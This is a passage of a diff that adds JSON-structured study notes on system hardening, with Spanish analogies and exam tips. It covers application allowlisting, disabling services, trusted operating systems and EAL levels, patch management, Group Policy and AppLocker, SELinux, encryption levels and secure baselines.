+              "Security Level",
+              "Management Effort"
+            ],
+            "rows": [
+              [
+                "**Allowlisting**",
+                "All blocked except listed",
+                "High",
+                "High"
+              ],
+              [
+                "**Blocklisting**",
+                "All allowed except listed",
+                "Lower",
+                "Lower initially"
+              ]
+            ]
+          }
+        ],
+        "list_items": [
+          "Most secure method — **everything is denied by default** except what is explicitly listed.",
+          "More difficult to maintain — every application update requires updating the allowlist.",
+          "Implemented in Windows via **AppLocker** within Group Policy.",
+          "Less secure than allowlisting — **everything is allowed by default** except what is explicitly denied.",
+          "Easier to manage initially but requires constant updates as new malware variants emerge.",
+          "Every new or unknown threat is permitted until a blocklist rule is created for it."
+        ],
+        "raw_content": "* **Definition:** The principle of configuring a workstation or server to provide only the essential applications and services required by that user, minimizing the attack surface introduced by unnecessary code.\n\nEvery installed application introduces additional code and therefore additional vulnerabilities. Administrators should actively uninstall unneeded applications and enforce strict controls over what can be installed or executed.\n\n> *Es como un restaurante que solo sirve los platos del menú. Si el cocinero solo tiene los ingredientes necesarios para esas recetas, hay mucho menos riesgo de que aparezca algo inesperado o dañino en la cocina.*\n\nIn large enterprise environments, a **secure baseline image** is created containing only the OS and minimum required applications, and deployed uniformly across all workstations.\n\n### Allowlisting (Application Allowlisting)\n\n* **Definition:** A security approach where **only explicitly approved applications** are permitted to run; all others are blocked by default.\n\n> *Es como la lista VIP de un nightclub exclusivo: si tu nombre no está en la lista, el portero no te deja entrar, sin importar quién seas.*\n\n- Most secure method — **everything is denied by default** except what is explicitly listed.\n- More difficult to maintain — every application update requires updating the allowlist.\n- Implemented in Windows via **AppLocker** within Group Policy.\n\n### Blocklisting (Application Blocklisting)\n\n* **Definition:** A security approach where **explicitly listed applications** are blocked from running; all other applications are permitted by default.\n\n> *Es como la lista de no-volar en un aeropuerto: si tu nombre está en esa lista, no abordas. Todos los demás pasan sin problema.*\n\n- Less secure than allowlisting — **everything is allowed by default** except what is explicitly denied.\n- Easier to manage initially but requires constant updates as new malware variants emerge.\n- Every new or unknown threat is permitted until a blocklist rule is created for it.\n\n| Method           | Default State             | Security Level | Management Effort |\n| ---------------- | ------------------------- | -------------- | ----------------- |\n| **Allowlisting** | All blocked except listed | High           | High              |\n| **Blocklisting** | All allowed except listed | Lower          | Lower initially   |\n\n⚠️ **Exam Tip:** For higher security, use allowlisting. At minimum, always use a blocklist to block known malicious applications. In a Windows domain environment, AppLocker deployed via Active Directory Group Policy is the standard tool for both approaches.\n\n---"
+      },
+      {
+        "name": "Unnecessary Services",
+        "definition": "Software processes or network services running in the background that are not required for essential system functionality or business operations — they consume resources, introduce vulnerabilities, and expand the attack surface.",
+        "analogy": "*Es como dejar los motores de todos los autos del estacionamiento encendidos por si acaso alguien los necesita. Consume combustible innecesariamente, hace ruido y deja todos los autos vulnerables a ser robados.*",
+        "tables": [],
+        "list_items": [
+          "**macOS:** Use **Activity Monitor** (Applications → Utilities → Activity Monitor) to find and quit/force-quit processes.",
+          "**Linux / macOS terminal:** Use `top` to list running processes with their PIDs, then `kill <PID>` to terminate the target process."
+        ],
+        "raw_content": "* **Definition:** Software processes or network services running in the background that are not required for essential system functionality or business operations — they consume resources, introduce vulnerabilities, and expand the attack surface.\n\nServices run in the background of the OS and perform various functions (e.g., print spooler, Windows Update). Any service not needed for business operations should be disabled.\n\n> *Es como dejar los motores de todos los autos del estacionamiento encendidos por si acaso alguien los necesita. Consume combustible innecesariamente, hace ruido y deja todos los autos vulnerables a ser robados.*\n\n### Disabling Services in Windows\n\nVia GUI:\n\n1. Run `services.msc` from the Start menu.\n2. Locate the target service (e.g., Windows Update → `wuauserv`).\n3. Double-click → **Stop** the service.\n4. Change Startup Type from `Automatic` to `Disabled` → Apply.\n\nVia Command Line:\n\n```\nsc stop wuauserv\nnet stop wuauserv\n```\n\n### Disabling Services in macOS / Linux\n\n- **macOS:** Use **Activity Monitor** (Applications → Utilities → Activity Monitor) to find and quit/force-quit processes.\n- **Linux / macOS terminal:** Use `top` to list running processes with their PIDs, then `kill <PID>` to terminate the target process.\n\n```bash\n# Ver procesos con sus PIDs\ntop\n\n# Terminar un proceso por su PID\nkill 2513\n```\n\n---"
+      },
+      {
+        "name": "Trusted Operating Systems (TOS)",
+        "definition": "Specialized operating systems that have undergone rigorous security evaluations and certifications to enforce stringent security policies — typically mandatory access controls — for handling sensitive or classified information.",
+        "analogy": "*Es como la diferencia entre un auto de consumo masivo y un vehículo blindado diseñado para presidentes: ambos te llevan de A a B, pero uno fue construido y certificado bajo estándares completamente distintos de seguridad.*",
+        "tables": [
+          {
+            "headers": [
+              "EAL Level",
+              "Description",
+              "Example"
+            ],
+            "rows": [
+              [
+                "EAL1",
+                "Functionally tested",
+                "Lowest assurance"
+              ],
+              [
+                "EAL4 / EAL4+",
+                "Methodically designed, tested, and reviewed",
+                "Windows, macOS, many Linux distros"
+              ],
+              [
+                "EAL6",
+                "Semi-formally verified design and tested",
+                "Integrity-178B (F-35, B-2, A380)"
+              ],
+              [
+                "EAL7",
+                "Formally verified design and tested",
+                "Highest assurance"
+              ]
+            ]
+          },
+          {
+            "headers": [
+              "OS",
+              "EAL Rating",
+              "Notes"
+            ],
+            "rows": [
+              [
+                "**Integrity-178B**",
+                "EAL6",
+                "POSIX-based; used in F-16, F-22, F-35, B-2, Airbus A380"
+              ],
+              [
+                "**SELinux** (on CentOS/RHEL)",
+                "EAL4+",
+                "MAC layer on top of standard Linux"
+              ],
+              [
+                "**Trusted Solaris**",
+                "EAL4+",
+                "Multi-level security, compartmentalization, detailed auditing"
+              ],
+              [
+                "**Windows (7+)**",
+                "EAL4 / EAL4+",
+                "Methodically designed and reviewed"
+              ],
+              [
+                "**macOS (10.6+)**",
+                "EAL4 / EAL4+",
+                "Same standard as modern Windows"
+              ],
+              [
+                "**Android**",
+                "Trusted elements",
+                "AppArmor for MAC; application sandboxing"
+              ]
+            ]
+          }
+        ],
+        "list_items": [],
+        "raw_content": "* **Definition:** Specialized operating systems that have undergone rigorous security evaluations and certifications to enforce stringent security policies — typically mandatory access controls — for handling sensitive or classified information.\n\n> *Es como la diferencia entre un auto de consumo masivo y un vehículo blindado diseñado para presidentes: ambos te llevan de A a B, pero uno fue construido y certificado bajo estándares completamente distintos de seguridad.*\n\nTrusted Operating Systems implement **Mandatory Access Control (MAC)**, where access permissions are determined by system policy — not by the data owner — ensuring that even the resource owner cannot override access restrictions.\n\n### Common Evaluation Assurance Levels (EAL)\n\nBased on the **Common Criteria for Information Technology Security Evaluation**:\n\n| EAL Level    | Description                                 | Example                            |\n| ------------ | ------------------------------------------- | ---------------------------------- |\n| EAL1         | Functionally tested                         | Lowest assurance                   |\n| EAL4 / EAL4+ | Methodically designed, tested, and reviewed | Windows, macOS, many Linux distros |\n| EAL6         | Semi-formally verified design and tested    | Integrity-178B (F-35, B-2, A380)   |\n| EAL7         | Formally verified design and tested         | Highest assurance                  |\n\n### Trusted OS Examples\n\n| OS                           | EAL Rating       | Notes                                                         |\n| ---------------------------- | ---------------- | ------------------------------------------------------------- |\n| **Integrity-178B**           | EAL6             | POSIX-based; used in F-16, F-22, F-35, B-2, Airbus A380       |\n| **SELinux** (on CentOS/RHEL) | EAL4+            | MAC layer on top of standard Linux                            |\n| **Trusted Solaris**          | EAL4+            | Multi-level security, compartmentalization, detailed auditing |\n| **Windows (7+)**             | EAL4 / EAL4+     | Methodically designed and reviewed                            |\n| **macOS (10.6+)**            | EAL4 / EAL4+     | Same standard as modern Windows                               |\n| **Android**                  | Trusted elements | AppArmor for MAC; application sandboxing                      |\n\n### Trusted Computing Base (TCB)\n\nAll parts of the system critical to security that must be trusted to operate correctly. Trusted OSes use **microkernel architectures** to minimize the TCB, reducing the attack surface.\n\n⚠️ **Exam Tip:** Higher EAL levels (6–7) are reserved for embedded or purpose-built systems (aircraft, medical devices, autonomous vehicles). General-purpose OSes like Windows and macOS are rated EAL4/EAL4+. Achieving EAL6+ for a generic OS would be too costly and impractical.\n\n---"
+      },
+      {
+        "name": "Updates and Patches",
+        "definition": "Software modifications released by developers to fix bugs, address security vulnerabilities, or improve features, stability, and performance of their software.",
+        "analogy": "*Es como el mantenimiento preventivo de un auto: si ignoras el cambio de aceite y las actualizaciones del fabricante, eventualmente algo se rompe de una manera que te podría haber costado mucho menos arreglar antes.*",
+        "tables": [
+          {
+            "headers": [
+              "Type",
+              "Purpose",
+              "Urgency"
+            ],
+            "rows": [
+              [
+                "**Hotfix**",
+                "Addresses a specific security vulnerability",
+                "Apply immediately after lab testing"
+              ],
+              [
+                "**Update**",
+                "Adds new functionality; may introduce new vulnerabilities",
+                "Scheduled deployment"
+              ],
+              [
+                "**Service Pack**",
+                "Bundles hundreds/thousands of hotfixes and updates into one installer",
+                "Periodic major release"
+              ]
+            ]
+          },
+          {
+            "headers": [
+              "#",
+              "Requirement",
+              "Key Detail"
+            ],
+            "rows": [
+              [
+                "1",
+                "**Dedicated tracking owner**",
+                "Assign a person or team responsible for monitoring vendor patch bulletins and releases"
+              ],
+              [
+                "2",
+                "**Automated patching mechanism**",
+                "Patch OS and all applications on all systems automatically — including weekends and holidays"
+              ],
+              [
+                "3",
+                "**Cloud resources included**",
+                "Cloud-based assets must be part of the patch management scope, not just on-prem systems"
+              ],
+              [
+                "4",
+                "**Triage patches by priority**",
+                "Classify every patch as **Urgent**, **Important**, or **Non-Critical** to allocate resources properly"
+              ],
+              [
+                "5",
+                "**Lab/test environment**",
+                "Test all Urgent and Important patches in a test environment before pushing to production"
+              ],
+              [
+                "6",
+                "**Detailed patching logs**",
+                "Maintain logs of all patching activity for evaluation, monitoring, and audit purposes"
+              ],
+              [
+                "7",
+                "**Firmware update process**",
+                "Have a mechanism to evaluate, test, and deploy firmware updates for network devices"
+              ],
+              [
+                "8",
+                "**Emergency patch process**",
+                "Have a fast-track process for pushing urgent hotfixes approved by an **Emergency Change Advisory Board**"
+              ],
+              [
+                "9",
+                "**Periodic non-critical rollup**",
+                "Bundle all Non-Critical patches into a single scheduled deployment (e.g., every two weeks)"
+              ]
+            ]
+          }
+        ],
+        "list_items": [],
+        "raw_content": "* **Definition:** Software modifications released by developers to fix bugs, address security vulnerabilities, or improve features, stability, and performance of their software.\n\n> *Es como el mantenimiento preventivo de un auto: si ignoras el cambio de aceite y las actualizaciones del fabricante, eventualmente algo se rompe de una manera que te podría haber costado mucho menos arreglar antes.*\n\nA good patch management program is one of the most effective hardening measures available. Attackers often reverse-engineer released patches within days to develop exploits targeting unpatched systems.\n\n### Types of Software Fixes\n\n| Type             | Purpose                                                               | Urgency                             |\n| ---------------- | --------------------------------------------------------------------- | ----------------------------------- |\n| **Hotfix**       | Addresses a specific security vulnerability                           | Apply immediately after lab testing |\n| **Update**       | Adds new functionality; may introduce new vulnerabilities             | Scheduled deployment                |\n| **Service Pack** | Bundles hundreds/thousands of hotfixes and updates into one installer | Periodic major release              |\n\n⚠️ **Exam Tip:** Know the difference: a **hotfix** patches a security issue (apply ASAP); an **update** adds features (may introduce new vulnerabilities); a **service pack** bundles both into one installer.\n\n#### Effective patch management program:\n\n| #   | Requirement                      | Key Detail                                                                                               |\n| --- | -------------------------------- | -------------------------------------------------------------------------------------------------------- |\n| 1   | **Dedicated tracking owner**     | Assign a person or team responsible for monitoring vendor patch bulletins and releases                   |\n| 2   | **Automated patching mechanism** | Patch OS and all applications on all systems automatically — including weekends and holidays             |\n| 3   | **Cloud resources included**     | Cloud-based assets must be part of the patch management scope, not just on-prem systems                  |\n| 4   | **Triage patches by priority**   | Classify every patch as **Urgent**, **Important**, or **Non-Critical** to allocate resources properly    |\n| 5   | **Lab/test environment**         | Test all Urgent and Important patches in a test environment before pushing to production                 |\n| 6   | **Detailed patching logs**       | Maintain logs of all patching activity for evaluation, monitoring, and audit purposes                    |\n| 7   | **Firmware update process**      | Have a mechanism to evaluate, test, and deploy firmware updates for network devices                      |\n| 8   | **Emergency patch process**      | Have a fast-track process for pushing urgent hotfixes approved by an **Emergency Change Advisory Board** |\n| 9   | **Periodic non-critical rollup** | Bundle all Non-Critical patches into a single scheduled deployment (e.g., every two weeks)               |\n\n---"
+      },
+      {
+        "name": "Patch Management",
+        "definition": "The systematic process of planning, testing, implementing, and auditing software patches and firmware updates to maintain the security and functionality of computer systems and network devices.",
+        "analogy": "*Es como gestionar el mantenimiento de toda una flota de camiones: no puedes ir uno por uno manualmente, necesitas un sistema que te diga cuáles necesitan cambio de aceite, programe las citas y confirme que el trabajo fue hecho.*",
+        "tables": [],
+        "list_items": [
+          "**Patch Rings** (staged rollout): Ring 1 (10–20 machines) → Ring 2 (50–100) → Ring 3 (1,000–2,000) → Ring 4 (full network). If issues arise, only a small group is affected.",
+          "**Disable Windows Update service** on endpoints in large environments; control patches via an update server instead.",
+          "**MDM (Mobile Device Manager)** for mobile devices.",
+          "Cisco uses **Cisco UCS Manager** for centralized firmware management.",
+          "Third-party tools like **Device Expert by ManageEngine** automate firmware upgrade, downgrade, and configuration management.",
+          "In Cisco devices, the OS is known as **IOS (Internetwork Operating System)**; updating it requires flashing the firmware."
+        ],
+        "raw_content": "* **Definition:** The systematic process of planning, testing, implementing, and auditing software patches and firmware updates to maintain the security and functionality of computer systems and network devices.\n\n> *Es como gestionar el mantenimiento de toda una flota de camiones: no puedes ir uno por uno manualmente, necesitas un sistema que te diga cuáles necesitan cambio de aceite, programe las citas y confirme que el trabajo fue hecho.*\n\nPatch management is critical for: **security** (fixing known vulnerabilities), **uptime** (preventing crashes), **compliance** (demonstrating patched CVEs), and **feature improvements**.\n\n### The Four-Step Patch Management Process\n\n1. **Planning** — Create policies and procedures to track available patches; verify compatibility; determine testing and deployment methods. Use tools like **Microsoft Endpoint Configuration Manager** or third-party tools.\n\n2. **Testing** — Test all patches in a lab or test environment before production deployment. Networks have unique configurations that can cause patches to behave unexpectedly. Identify issues before affecting thousands of users.\n\n3. **Implementation** — Deploy tested patches to all endpoints. Recommended approaches:\n   \n   - **Patch Rings** (staged rollout): Ring 1 (10–20 machines) → Ring 2 (50–100) → Ring 3 (1,000–2,000) → Ring 4 (full network). If issues arise, only a small group is affected.\n   - **Disable Windows Update service** on endpoints in large environments; control patches via an update server instead.\n   - **MDM (Mobile Device Manager)** for mobile devices.\n\n4. **Auditing** — Scan the network post-deployment to verify patches were installed correctly and identify unexpected failures.\n\n### Firmware Management\n\nNetwork devices (switches, routers) run **firmware** — their operating system equivalent. Firmware must be updated just like any OS.\n\n- Cisco uses **Cisco UCS Manager** for centralized firmware management.\n- Third-party tools like **Device Expert by ManageEngine** automate firmware upgrade, downgrade, and configuration management.\n- In Cisco devices, the OS is known as **IOS (Internetwork Operating System)**; updating it requires flashing the firmware.\n\n⚠️ **Exam Tip:** Patch management covers not just workstations and servers, but also cloud-based resources, mobile devices (via MDM), and network device firmware. All four must be in scope.\n\n---"
+      },
+      {
+        "name": "Group Policies",
+        "definition": "A set of rules and configurations in Windows environments that allow administrators to centrally manage and control user and computer settings — enforcing compliance and security standards across an organization.",
+        "analogy": "*Es como el reglamento interno de una empresa: en vez de decirle las reglas a cada empleado de forma individual, las publicas una vez y aplican automáticamente para todos desde el primer día.*",
+        "tables": [],
+        "list_items": [
+          "Password complexity requirements",
+          "Account lockout policies",
+          "Software and application restrictions (via **AppLocker**)",
+          "User rights assignments",
+          "Audit settings",
+          "**Publisher** — Block all executables from a compromised software publisher.",
+          "**Path** — Block all executables from a specific folder (e.g., `%WINDIR%\\Temp\\*`).",
+          "**File Hash** — Block a specific known-malicious executable by its cryptographic hash.",
+          "Every deviation from the baseline should be categorized as **acceptable/expected** or **requires investigation**.",
+          "High network utilization during expected low-traffic periods has been used to detect **data exfiltration** in real-world breaches."
+        ],
+        "raw_content": "* **Definition:** A set of rules and configurations in Windows environments that allow administrators to centrally manage and control user and computer settings — enforcing compliance and security standards across an organization.\n\n> *Es como el reglamento interno de una empresa: en vez de decirle las reglas a cada empleado de forma individual, las publicas una vez y aplican automáticamente para todos desde el primer día.*\n\nGroup policies are accessed via the **Group Policy Editor** (`gpedit` from the Run prompt). In a Windows domain, the **Active Directory Domain Controller** provides an advanced Group Policy Editor.\n\n### Key Group Policy Capabilities\n\n- Password complexity requirements\n- Account lockout policies\n- Software and application restrictions (via **AppLocker**)\n- User rights assignments\n- Audit settings\n\n### Creating AppLocker Rules (Example)\n\nWithin Group Policy Editor: `Computer Configuration → Windows Settings → Security Settings → Application Control Policies → AppLocker → Executable Rules`\n\nRule conditions available:\n\n- **Publisher** — Block all executables from a compromised software publisher.\n- **Path** — Block all executables from a specific folder (e.g., `%WINDIR%\\Temp\\*`).\n- **File Hash** — Block a specific known-malicious executable by its cryptographic hash.\n\n### Baselining\n\n* **Definition:** The process of measuring changes in a network, hardware, or software environment to establish what \"normal\" looks like — enabling detection of deviations that may indicate a security incident.\n\n> *Es como conocer el consumo eléctrico normal de tu casa mes a mes. Si un sábado en la tarde ves un pico enorme en el marcador, sabes que algo inusual está pasando y lo investigas.*\n\n- Every deviation from the baseline should be categorized as **acceptable/expected** or **requires investigation**.\n- High network utilization during expected low-traffic periods has been used to detect **data exfiltration** in real-world breaches.\n\n---"
+      },
+      {
+        "name": "SELinux — Security-Enhanced Linux",
+        "definition": "A security framework for Linux-based operating systems, created by the NSA, that implements Mandatory Access Control (MAC) to confine and limit the actions of processes and users — enhancing overall system security beyond the default DAC model.",
+        "analogy": "*Es como pasar del sistema de honor en un archivo de oficina (donde tú decides quién puede ver tus documentos) a un sistema de clasificación militar (donde el propio edificio, no tú, controla quién puede entrar a cada cuarto según su nivel de autorización).*",
+        "tables": [
+          {
+            "headers": [
+              "Model",
+              "Who Controls Access",
+              "Default in"
+            ],
+            "rows": [
+              [
+                "**DAC** (Discretionary Access Control)",
+                "Object owner (`chown`, `chmod`)",
+                "Standard Linux"
+              ],
+              [
+                "**MAC** (Mandatory Access Control)",
+                "System policy (administrator-defined)",
+                "SELinux, AppArmor"
+              ]
+            ]
+          },
+          {
+            "headers": [
+              "Context",
+              "Description",
+              "Common Values"
+            ],
+            "rows": [
+              [
+                "**User**",
+                "Defines which users can access an object",
+                "`unconfined_u`, `user_u`, `sysadmin_u`, `root`"
+              ],
+              [
+                "**Role**",
+                "Defines which roles can access an object",
+                "`object_r` (for files/directories)"
+              ],
+              [
+                "**Type**",
+                "Most important — groups objects with similar security requirements",
+                "Fine-grained access labels"
+              ],
+              [
+                "**Level** *(optional)*",
+                "Sensitivity level for multi-level security (MLS)",
+                "Adds another layer of constraint beyond the three main contexts"
+              ]
+            ]
+          },
+          {
+            "headers": [
+              "Mode",
+              "Description"
+            ],
+            "rows": [
+              [
+                "**Disabled**",
+                "SELinux is off; system falls back to standard DAC"
+              ],
+              [
+                "**Enforcing**",
+                "All SELinux security policies are actively enforced; processes cannot violate them"
+              ],
+              [
+                "**Permissive**",
+                "SELinux is on but policies are not enforced; violations are logged but allowed — useful for troubleshooting"
+              ]
+            ]
+          },
+          {
+            "headers": [
+              "Policy Type",
+              "Behavior"
+            ],
+            "rows": [
+              [
+                "**Targeted** *(default in RHEL/CentOS)*",
+                "Only specifically targeted processes run in a confined domain; all others run unconfined"
+              ],
+              [
+                "**Strict**",
+                "MAC is enforced on every subject and object on the system — complex to configure"
+              ]
+            ]
+          }
+        ],
+        "list_items": [],
+        "raw_content": "* **Definition:** A security framework for Linux-based operating systems, created by the NSA, that implements Mandatory Access Control (MAC) to confine and limit the actions of processes and users — enhancing overall system security beyond the default DAC model.\n\n> *Es como pasar del sistema de honor en un archivo de oficina (donde tú decides quién puede ver tus documentos) a un sistema de clasificación militar (donde el propio edificio, no tú, controla quién puede entrar a cada cuarto según su nivel de autorización).*\n\nSELinux is the default context-based permission scheme in **CentOS** and **Red Hat Enterprise Linux (RHEL)**. It prevents unauthorized processes from accessing or tampering with data, bypassing security mechanisms, or executing untrustworthy programs.\n\n### DAC vs. MAC\n\n| Model                                  | Who Controls Access                   | Default in        |\n| -------------------------------------- | ------------------------------------- | ----------------- |\n| **DAC** (Discretionary Access Control) | Object owner (`chown`, `chmod`)       | Standard Linux    |\n| **MAC** (Mandatory Access Control)     | System policy (administrator-defined) | SELinux, AppArmor |\n\n### SELinux Contexts\n\nEvery file and process in SELinux is labeled with contexts that together determine access:\n\n| Context                | Description                                                        | Common Values                                                   |\n| ---------------------- | ------------------------------------------------------------------ | --------------------------------------------------------------- |\n| **User**               | Defines which users can access an object                           | `unconfined_u`, `user_u`, `sysadmin_u`, `root`                  |\n| **Role**               | Defines which roles can access an object                           | `object_r` (for files/directories)                              |\n| **Type**               | Most important — groups objects with similar security requirements | Fine-grained access labels                                      |\n| **Level** *(optional)* | Sensitivity level for multi-level security (MLS)                   | Adds another layer of constraint beyond the three main contexts |\n\n### SELinux Modes\n\n| Mode           | Description                                                                                                 |\n| -------------- | ----------------------------------------------------------------------------------------------------------- |\n| **Disabled**   | SELinux is off; system falls back to standard DAC                                                           |\n| **Enforcing**  | All SELinux security policies are actively enforced; processes cannot violate them                          |\n| **Permissive** | SELinux is on but policies are not enforced; violations are logged but allowed — useful for troubleshooting |\n\n### SELinux Policy Types\n\n| Policy Type                             | Behavior                                                                                 |\n| --------------------------------------- | ---------------------------------------------------------------------------------------- |\n| **Targeted** *(default in RHEL/CentOS)* | Only specifically targeted processes run in a confined domain; all others run unconfined |\n| **Strict**                              | MAC is enforced on every subject and object on the system — complex to configure         |\n\n⚠️ **Exam Tip:** When SELinux is first enforced on a system, expect a high volume of false violations in the audit log as policies are tuned. SELinux is only as strong as the restrictive profiles you create.\n\n### AppArmor\n\nAppArmor is an alternative context-based MAC implementation for Linux (common on Ubuntu/Debian). Like SELinux, it enforces MAC at the OS level, including on mobile devices running Android.\n\n---"
+      },
+      {
+        "name": "Data Encryption Levels",
+        "definition": "The application of encryption at different layers of the data storage hierarchy — from individual records to entire disk drives — each providing a different granularity of protection.",
+        "analogy": "*Es como las capas de seguridad de una bóveda bancaria: puedes cifrar el edificio completo (disco completo), solo el cuarto de la bóveda (partición), solo cada caja de seguridad individual (archivo) o incluso el contenido dentro de cada sobre dentro de cada caja (registro de base de datos).*",
+        "tables": [
+          {
+            "headers": [
+              "Level",
+              "Scope",
+              "Example Tool",
+              "Use Case"
+            ],
+            "rows": [
+              [
+                "**Full-Disk**",
+                "Entire storage device",
+                "BitLocker (Windows), FileVault (macOS)",
+                "Protect all data if device is physically stolen"
+              ],
+              [
+                "**Partition**",
+                "A specific partition only",
+                "VeraCrypt",
+                "Encrypt only sensitive partitions; reduce performance impact"
+              ],
+              [
+                "**Volume**",
+                "A defined set of space creating an encrypted container",
+                "VeraCrypt",
+                "Flexible encrypted container; can be used alongside full-disk encryption"
+              ],
+              [
+                "**File**",
+                "Individual files",
+                "GPG (GNU Privacy Guard)",
+                "Encrypt specific files before transmission"
+              ],
+              [
+                "**Database**",
+                "Entire database (may span multiple devices/cloud)",
+                "SQL Server TDE (Transparent Data Encryption)",
+                "Automatic encrypt/decrypt; no application changes required"
+              ],
+              [
+                "**Record**",
+                "Individual rows or columns within a database",
+                "Custom DB implementations",
+                "Encrypt only sensitive fields (e.g., credit card numbers, SSNs)"
+              ]
+            ]
+          }
+        ],
+        "list_items": [],
+        "raw_content": "* **Definition:** The application of encryption at different layers of the data storage hierarchy — from individual records to entire disk drives — each providing a different granularity of protection.\n\n> *Es como las capas de seguridad de una bóveda bancaria: puedes cifrar el edificio completo (disco completo), solo el cuarto de la bóveda (partición), solo cada caja de seguridad individual (archivo) o incluso el contenido dentro de cada sobre dentro de cada caja (registro de base de datos).*\n\nEncryption adds overhead to read/write operations, so the level of encryption chosen must balance **security requirements against system performance**.\n\n### Encryption Levels Comparison\n\n| Level         | Scope                                                  | Example Tool                                 | Use Case                                                                 |\n| ------------- | ------------------------------------------------------ | -------------------------------------------- | ------------------------------------------------------------------------ |\n| **Full-Disk** | Entire storage device                                  | BitLocker (Windows), FileVault (macOS)       | Protect all data if device is physically stolen                          |\n| **Partition** | A specific partition only                              | VeraCrypt                                    | Encrypt only sensitive partitions; reduce performance impact             |\n| **Volume**    | A defined set of space creating an encrypted container | VeraCrypt                                    | Flexible encrypted container; can be used alongside full-disk encryption |\n| **File**      | Individual files                                       | GPG (GNU Privacy Guard)                      | Encrypt specific files before transmission                               |\n| **Database**  | Entire database (may span multiple devices/cloud)      | SQL Server TDE (Transparent Data Encryption) | Automatic encrypt/decrypt; no application changes required               |\n| **Record**    | Individual rows or columns within a database           | Custom DB implementations                    | Encrypt only sensitive fields (e.g., credit card numbers, SSNs)          |\n\n⚠️ **Exam Tip:** Know the tools: **BitLocker** (Windows full-disk), **FileVault** (macOS full-disk), **VeraCrypt** (partition and volume), **GPG** (file-level), **TDE** (database-level). Record-level provides the most granular encryption within a database.\n\n---"
+      },
+      {
+        "name": "Secure Baselines",
+        "definition": "A predefined, standardized configuration and associated settings for systems, applications, or networks that establish a secure starting point — minimizing security risks and ensuring consistent security posture across all organizational assets.",
+        "analogy": "*Es como la configuración de fábrica de seguridad de una franquicia. Cada sucursal nueva abre con el mismo sistema de alarmas, las mismas cerraduras y los mismos procedimientos. No cada gerente decide su propio nivel de seguridad.*",
+        "tables": [],
+        "list_items": [
+          "Configure firewalls, user permissions, and encryption protocols.",
+          "Ensure antivirus/antimalware solutions are properly installed and updated.",
+          "Use **automated tools and scripts** for uniform deployment across all assets not provisioned via the disk image.",
+          "In Windows domains: use **GPOs (Group Policy Objects)** to enforce password policies, user rights, and audit settings.",
+          "In cloud environments: use tools like **AWS Config** to define and enforce secure configurations across cloud resources.",
+          "**Lock down systems** so users cannot install software or modify configurations.",
+          "Conduct **regular audits and continuous monitoring** to detect deviations from the baseline.",
+          "Trigger alerts via the **SOC (Security Operations Center)** for immediate remediation of deviations.",
+          "Periodically review and update the baseline to align with infrastructure changes, business needs, and the evolving threat landscape.",
+          "Provide **employee training and awareness** about the importance of adhering to baseline configurations and reporting suspicious activity."
+        ],
+        "raw_content": "* **Definition:** A predefined, standardized configuration and associated settings for systems, applications, or networks that establish a secure starting point — minimizing security risks and ensuring consistent security posture across all organizational assets.\n\n> *Es como la configuración de fábrica de seguridad de una franquicia. Cada sucursal nueva abre con el mismo sistema de alarmas, las mismas cerraduras y los mismos procedimientos. No cada gerente decide su propio nivel de seguridad.*\n\nSecure baselines are referenced against frameworks such as **ISO 27001** and **NIST Special Publication 800-53**.\n\n### Establishing a Secure Baseline\n\n1. Conduct a thorough assessment to identify data types, workflows, and potential vulnerabilities.\n2. Start with a **brand new device** → format → install OS → update → configure → secure.\n3. Validate against baseline configuration guidance and scan for known vulnerabilities.\n4. Install only the applications required by employees for their specific job roles.\n5. Scan again and remediate newly introduced vulnerabilities.\n6. **Create a disk image** of this configured machine — this becomes the known-good secure baseline image for all future deployments.\n7. Continuously refine and update the image as patches, hotfixes, and service packs are released.\n\n### Deploying a Secure Baseline\n\n- Configure firewalls, user permissions, and encryption protocols.\n- Ensure antivirus/antimalware solutions are properly installed and updated.\n- Use **automated tools and scripts** for uniform deployment across all assets not provisioned via the disk image.\n- In Windows domains: use **GPOs (Group Policy Objects)** to enforce password policies, user rights, and audit settings.\n- In cloud environments: use tools like **AWS Config** to define and enforce secure configurations across cloud resources.\n\n### Maintaining a Secure Baseline\n\n- **Lock down systems** so users cannot install software or modify configurations.\n- Conduct **regular audits and continuous monitoring** to detect deviations from the baseline.\n- Trigger alerts via the **SOC (Security Operations Center)** for immediate remediation of deviations.\n- Periodically review and update the baseline to align with infrastructure changes, business needs, and the evolving threat landscape.\n- Provide **employee training and awareness** about the importance of adhering to baseline configurations and reporting suspicious activity.\n\n⚠️ **Exam Tip:** Secure baselines tie together everything in this section: default configurations are changed, unnecessary services are disabled, patches are applied, group policies enforce restrictions, and the result is captured as an image. This image is the secure baseline that gets deployed, monitored, and continuously maintained.\n\n---"
+      },
+      {
+        "name": "Key Terms Glossary",
+        "definition": "Hardening: Reducing a system's attack surface through security configurations and controls",
+        "analogy": "",
+        "tables": [
+          {
+            "headers": [
+              "Term",
+              "Definition"
+            ],
+            "rows": [
+              [
+                "**Hardening**",
+                "Reducing a system's attack surface through security configurations and controls"
+              ],
+              [
+                "**Default Credentials**",
+                "Factory-set username/password combinations for initial device access"
+              ],
+              [
+                "**Least Functionality**",
+                "Configuring systems with only the minimum necessary applications and services"
+              ],
+              [
+                "**Allowlisting**",
+                "Security model where only explicitly approved applications can run"
+              ],
+              [
+                "**Blocklisting**",
+                "Security model where explicitly listed applications are blocked; all others permitted"
+              ],
+              [
+                "**AppLocker**",
+                "Windows tool for implementing application allowlisting/blocklisting via Group Policy"
+              ],
+              [
+                "**Unnecessary Services**",
+                "Background processes not required for business operations that expand the attack surface"
+              ],
+              [
+                "**Trusted Operating System (TOS)**",
+                "An OS with rigorous security certifications that enforces mandatory access controls"
+              ],
+              [
+                "**EAL (Evaluation Assurance Level)**",
+                "Common Criteria rating system for OS security assurance (EAL1 lowest to EAL7 highest)"
+              ],
+              [
+                "**Trusted Computing Base (TCB)**",
+                "The set of all components in a system that are critical to its security"
+              ],
+              [
+                "**Hotfix**",
+                "Immediate security patch addressing a specific vulnerability"
+              ],
+              [
+                "**Update**",
+                "Software modification adding functionality; may introduce new vulnerabilities"
+              ],
+              [
+                "**Service Pack**",
+                "Bundled collection of hotfixes and updates into a single installer"
+              ],
+              [
+                "**Patch Management**",
+                "The four-step process of planning, testing, implementing, and auditing patches"
+              ],
+              [
+                "**Patch Rings**",
+                "Staged rollout strategy deploying patches to progressively larger groups"
+              ],
+              [
+                "**Firmware**",
+                "The OS-equivalent software running on network devices like switches and routers"
+              ],
+              [
+                "**Group Policy**",
+                "Windows rules applied centrally to users and computers via the Group Policy Editor"
+              ],
+              [
+                "**Baselining**",
+                "Measuring changes in an environment to establish what \"normal\" looks like"
+              ],
